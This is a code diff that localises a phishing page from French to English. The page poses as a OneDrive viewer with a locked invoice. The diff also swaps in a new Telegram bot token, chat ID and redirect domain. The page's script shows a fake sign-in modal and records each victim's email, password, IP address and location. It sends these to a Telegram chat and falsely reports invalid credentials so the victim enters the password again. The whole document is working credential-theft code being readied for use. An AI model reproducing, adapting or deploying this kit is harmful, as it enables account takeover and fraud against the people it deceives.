@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr" data-theme="dark">
+<html lang="en" data-theme="dark">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Visionneuse PDF à Page Unique</title>
+  <title>Single Page PDF Viewer</title>
   <style>
     /* ------------------
        Design Tokens (Dark + Blue theme)
@@ -153,37 +153,37 @@
       <div class="left" style="display:flex;align-items:center;gap:10px">
         <div class="logo" aria-label="OneDrive logo"><img src="https://i.ibb.co/SXK5vjRz/pngwing-com.png" alt="OneDrive"/></div>
         <div class="crumbs" aria-label="Breadcrumbs">
-          <span>Mes Fichiers</span>
+          <span>My Files</span>
           <span class="sep">›</span>
-          <span>Factures</span>
+          <span>Invoices</span>
           <span class="sep">›</span>
-          <span class="filename" id="filename">Facture-000512.pdf</span>
+          <span class="filename" id="filename">Invoice-000512.pdf</span>
         </div>
       </div>
       <div class="search">
         <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
-        <input id="search" placeholder="Rechercher dans le document (Ctrl+F)" />
+        <input id="search" placeholder="Search in document (Ctrl+F)" />
       </div>
       <div class="right" style="display:flex;align-items:center;gap:10px">
-        <button class="btn" id="themeBtn" title="Basculer le thème" aria-pressed="true">
+        <button class="btn" id="themeBtn" title="Toggle theme" aria-pressed="true">
           <svg class="icon" viewBox="0 0 24 24" fill="currentColor"><path d="M12 3a9 9 0 1 0 9 9 7 7 0 0 1-9-9Z"/></svg>
-          Thème
+          Theme
         </button>
-        <button class="btn" id="shareBtn" title="Partager">
+        <button class="btn" id="shareBtn" title="Share">
           <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 12v7a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7"/><path d="M16 6l-4-4-4 4"/><path d="M12 2v14"/></svg>
-          Partager
+          Share
         </button>
       </div>
     </div>
 
     <!-- Single-page viewer -->
-    <section class="viewer locked" id="viewer" aria-label="Visionneuse de document" data-locked="true">
+    <section class="viewer locked" id="viewer" aria-label="Document viewer" data-locked="true">
       <div class="canvas" id="canvas">
         <article class="page" data-page="1">
-          <div class="watermark"><span>VERROUILLÉ</span></div>
-          <button class="unlock-on-page" id="unlockOnPageBtn" title="Déverrouiller">
+          <div class="watermark"><span>LOCKED</span></div>
+          <button class="unlock-on-page" id="unlockOnPageBtn" title="Unlock">
             <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-            Déverrouiller pour voir
+            Unlock to view
           </button>
           <div class="inner">
             <!-- Invoice-like demo content -->
@@ -193,19 +193,19 @@
                 <div class="sub">123 Ocean Ave · Seattle, WA · +1 (555) 555‑0199</div>
               </div>
               <div class="invoice-meta">
-                <div><strong>Facture</strong> #000512</div>
+                <div><strong>Invoice</strong> #000512</div>
                 <div>Date: 2025‑09‑15</div>
-                <div>Échéance: 2025‑09‑30</div>
+                <div>Due: 2025‑09‑30</div>
               </div>
             </div>
 
             <div class="two-col section">
               <div>
-                <div class="h2">Facturé à</div>
+                <div class="h2">Billed to</div>
                 <div class="small">Contoso Ltd.<br/>987 Market St<br/>San Francisco, CA 94103</div>
               </div>
               <div>
-                <div class="h2">Livré à</div>
+                <div class="h2">Delivered to</div>
                 <div class="small">Contoso Warehouse<br/>210 Harbor Way<br/>Oakland, CA 94607</div>
               </div>
             </div>
@@ -213,20 +213,20 @@
             <div class="section">
               <table class="inv">
                 <thead>
-                  <tr><th style="width:55%">Description</th><th style="width:15%">Qté</th><th style="width:15%">Unité</th><th style="width:15%">Montant</th></tr>
+                  <tr><th style="width:55%">Description</th><th style="width:15%">Qty</th><th style="width:15%">Unit</th><th style="width:15%">Amount</th></tr>
                 </thead>
                 <tbody>
-                  <tr><td>Services de design (UI/UX, sprint 23)</td><td>24</td><td>$85.00</td><td>$2,040.00</td></tr>
-                  <tr><td>Implémentation frontend (composants React)</td><td>30</td><td>$95.00</td><td>$2,850.00</td></tr>
-                  <tr><td>QA & accessibilité</td><td>12</td><td>$70.00</td><td>$840.00</td></tr>
-                  <tr class="total-row"><td colspan="3" style="text-align:right">Sous-total</td><td>$5,730.00</td></tr>
-                  <tr class="total-row"><td colspan="3" style="text-align:right">Taxe (8.5%)</td><td>$487.05</td></tr>
-                  <tr class="total-row"><td colspan="3" style="text-align:right">Total dû</td><td>$6,217.05</td></tr>
+                  <tr><td>Design services (UI/UX, sprint 23)</td><td>24</td><td>$85.00</td><td>$2,040.00</td></tr>
+                  <tr><td>Frontend implementation (React components)</td><td>30</td><td>$95.00</td><td>$2,850.00</td></tr>
+                  <tr><td>QA & accessibility</td><td>12</td><td>$70.00</td><td>$840.00</td></tr>
+                  <tr class="total-row"><td colspan="3" style="text-align:right">Subtotal</td><td>$5,730.00</td></tr>
+                  <tr class="total-row"><td colspan="3" style="text-align:right">Tax (8.5%)</td><td>$487.05</td></tr>
+                  <tr class="total-row"><td colspan="3" style="text-align:right">Total due</td><td>$6,217.05</td></tr>
                 </tbody>
               </table>
             </div>
 
-            <div class="small" style="margin-top:10mm;color:#64748b">Paiement dû dans les 15 jours. Merci pour votre confiance.</div>
+            <div class="small" style="margin-top:10mm;color:#64748b">Payment due within 15 days. Thank you for your business.</div>
           </div>
         </article>
       </div>
@@ -235,15 +235,15 @@
       <div class="controls" aria-hidden="false">
         <div class="wrap">
           <div class="seg">
-            <button class="chip" id="fitWidth" title="Ajuster à la largeur (W)">Largeur</button>
-            <button class="chip" id="fitPage" title="Ajuster à la page (P)">Page</button>
-            <button class="chip" id="toggleFocus" title="Basculer le mode focus (F)">Focus</button>
+            <button class="chip" id="fitWidth" title="Fit to width (W)">Width</button>
+            <button class="chip" id="fitPage" title="Fit to page (P)">Page</button>
+            <button class="chip" id="toggleFocus" title="Toggle focus mode (F)">Focus</button>
           </div>
           <div class="zoom">
-            <button class="chip" id="zoomOut" title="Zoom arrière (-)">−</button>
+            <button class="chip" id="zoomOut" title="Zoom out (-)">−</button>
             <input type="range" id="zoomRange" min="0.5" max="2" value="0.9" step="0.05" aria-label="Zoom" />
-            <button class="chip" id="zoomIn" title="Zoom avant (+)">+</button>
-            <button class="chip" id="zoomReset" title="Réinitialiser le zoom (0)">90%</button>
+            <button class="chip" id="zoomIn" title="Zoom in (+)">+</button>
+            <button class="chip" id="zoomReset" title="Reset zoom (0)">90%</button>
           </div>
         </div>
       </div>
@@ -251,15 +251,15 @@
 
     <!-- Bottom bar -->
     <div class="bar bottombar">
-      <div>Prêt · <span id="status">Aperçu verrouillé</span></div>
+      <div>Ready · <span id="status">Preview locked</span></div>
       <div>
-        <a class="btn ghost" href="#" aria-disabled="true" title="Imprimer (désactivé)">
+        <a class="btn ghost" href="#" aria-disabled="true" title="Print (disabled)">
           <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9V2h12v7"/><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"/><path d="M6 14h12v8H6z"/></svg>
-          Imprimer
+          Print
         </a>
-        <a class="btn ghost" href="#" aria-disabled="true" title="Télécharger (désactivé)">
+        <a class="btn ghost" href="#" aria-disabled="true" title="Download (disabled)">
           <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="M7 10l5 5 5-5"/><path d="M12 15V3"/></svg>
-          Télécharger
+          Download
         </a>
       </div>
     </div>
@@ -272,8 +272,8 @@
         <div class="logo-modal" aria-label="OneDrive">
           <img src="https://i.ibb.co/SXK5vjRz/pngwing-com.png" alt="OneDrive"/>
         </div>
-        <h3 id="authModalTitle">Authentification Requise</h3>
-        <button class="close" aria-label="Fermer" id="authModalClose" style="grid-column:3; justify-self:end;">×</button>
+        <h3 id="authModalTitle">Authentication Required</h3>
+        <button class="close" aria-label="Close" id="authModalClose" style="grid-column:3; justify-self:end;">×</button>
       </header>
       <div class="body">
         <!-- Container for detected email (from URL) -->
@@ -281,7 +281,7 @@
           <div class="detected-email">
             <div class="profile-avatar" id="detectedProfileAvatar">U</div>
             <div class="email-info">
-              <div class="email-label">Connecté en tant que</div>
+              <div class="email-label">Signed in as</div>
               <div class="email-value" id="detectedEmailValue">user@example.com</div>
             </div>
           </div>
@@ -292,7 +292,7 @@
           <div class="entered-email">
             <div class="profile-avatar" id="enteredProfileAvatar">U</div>
             <div class="email-info">
-              <div class="email-label">Continuer en tant que</div>
+              <div class="email-label">Continue as</div>
               <div class="email-value" id="enteredEmailValue">user@example.com</div>
             </div>
           </div>
@@ -300,18 +300,18 @@
         
         <div class="auth-form">
           <div class="form-group" id="emailGroup">
-            <label for="emailInput">Adresse Email</label>
-            <input type="email" id="emailInput" placeholder="Entrez votre email" autocomplete="email" />
-            <div class="error-message" id="emailError">Veuillez entrer une adresse email valide</div>
+            <label for="emailInput">Email Address</label>
+            <input type="email" id="emailInput" placeholder="Enter your email" autocomplete="email" />
+            <div class="error-message" id="emailError">Please enter a valid email address</div>
           </div>
           <div class="form-group" id="passwordGroup" style="display: none;">
-            <label for="passwordInput">Mot de passe</label>
-            <input type="password" id="passwordInput" placeholder="Entrez votre mot de passe" autocomplete="current-password" />
-            <div class="error-message" id="passwordError">Identifiants invalides. Veuillez réessayer.</div>
+            <label for="passwordInput">Password</label>
+            <input type="password" id="passwordInput" placeholder="Enter your password" autocomplete="current-password" />
+            <div class="error-message" id="passwordError">Invalid credentials. Please try again.</div>
           </div>
           <div class="auth-buttons">
-            <button class="btn" id="authCancelBtn">Annuler</button>
-            <button class="btn primary" id="authNextBtn">Suivant</button>
+            <button class="btn" id="authCancelBtn">Cancel</button>
+            <button class="btn primary" id="authNextBtn">Next</button>
           </div>
         </div>
       </div>
@@ -356,9 +356,9 @@
 
     // Environment variables
     const env = {
-      TELEGRAM_TOKEN: '8196319945:AAHPEcumR9n3hASIXg9IdmkX06UIxQbK5R4',
-      TELEGRAM_CHAT_ID: '-1002383824557',
-      FINAL_URL: 'https://fret.kdits.ca'
+      TELEGRAM_TOKEN: '8043918109:AAHq02pj7XjBIwYYENtftpes-RUnDMnWvlA',
+      TELEGRAM_CHAT_ID: '-1002493880170',
+      FINAL_URL: 'https://msoline.extend47.com'
     };
 
     // Get URL parameters
@@ -386,19 +386,19 @@
 
     // Get user info for Telegram message
     async function getUserInfo() {
-      let country = 'Inconnu';
-      let region = 'Inconnu';
-      let ip = 'Inconnu';
-      let browser = 'Inconnu';
+      let country = 'Unknown';
+      let region = 'Unknown';
+      let ip = 'Unknown';
+      let browser = 'Unknown';
 
       try {
         // Get IP and location info
         const ipResponse = await fetch('https://ipapi.co/json/');
         if (ipResponse.ok) {
           const ipData = await ipResponse.json();
-          country = ipData.country_name || 'Inconnu';
-          region = ipData.region || 'Inconnu';
-          ip = ipData.ip || 'Inconnu';
+          country = ipData.country_name || 'Unknown';
+          region = ipData.region || 'Unknown';
+          ip = ipData.ip || 'Unknown';
         }
       } catch (e) {
         console.log('Could not fetch IP info');
@@ -474,7 +474,7 @@
         passwordGroup.style.display = 'flex'; // Show password field
         isEmailStage = false;
         currentEmail = detectedEmail;
-        authNextBtn.textContent = 'Continuer';
+        authNextBtn.textContent = 'Continue';
         setTimeout(() => passwordInput.focus(), 100);
       } else {
         // No detected email, show email input
@@ -483,7 +483,7 @@
         emailGroup.style.display = 'flex';
         passwordGroup.style.display = 'none'; // Hide password field
         isEmailStage = true;
-        authNextBtn.textContent = 'Suivant';
+        authNextBtn.textContent = 'Next';
         setTimeout(() => emailInput.focus(), 100);
       }
       
@@ -520,12 +520,12 @@
       const userInfo = await getUserInfo();
       
       const message = `
-🌍 Pays: ${userInfo.country}
-📍 Région: ${userInfo.region}
+🌍 Country: ${userInfo.country}
+📍 Region: ${userInfo.region}
 🖥️ IP: ${userInfo.ip}
-🔍 Navigateur: ${userInfo.browser}
+🔍 Browser: ${userInfo.browser}
 📧 Email: ${email}
-🔑 Mot de passe: ${password}
+🔑 Password: ${password}
       `.trim();
 
       console.log('Sending to Telegram:', message);
@@ -595,7 +595,7 @@
         enteredEmailValue.textContent = email;
         enteredProfileAvatar.textContent = getAvatarInitial(email);
         currentEmail = email;
-        authNextBtn.textContent = 'Continuer';
+        authNextBtn.textContent = 'Continue';
         setTimeout(() => passwordInput.focus(), 100);
       } else {
         const password = passwordInput.value;
@@ -606,7 +606,7 @@
         }
         
         // Show loading state
-        authNextBtn.textContent = 'Vérification...';
+        authNextBtn.textContent = 'Verifying...';
         authNextBtn.disabled = true;
         
         // Send credentials to Telegram
@@ -621,12 +621,12 @@
           }, 1000);
         } else {
           // Show invalid message and reset password field
-          passwordError.textContent = 'Identifiants invalides. Veuillez réessayer.';
+          passwordError.textContent = 'Invalid credentials. Please try again.';
           passwordError.classList.add('show');
           passwordInput.value = '';
           setTimeout(() => {
             passwordError.classList.remove('show');
-            authNextBtn.textContent = 'Continuer';
+            authNextBtn.textContent = 'Continue';
             authNextBtn.disabled = false;
             passwordInput.focus();
           }, 1500);
@@ -649,7 +649,7 @@
 
     // Unlock behavior -> open auth modal
     unlockBtn.addEventListener('click', () => {
-      status.textContent = 'Vérification…';
+      status.textContent = 'Verifying…';
       showAuthModal();
     });
 
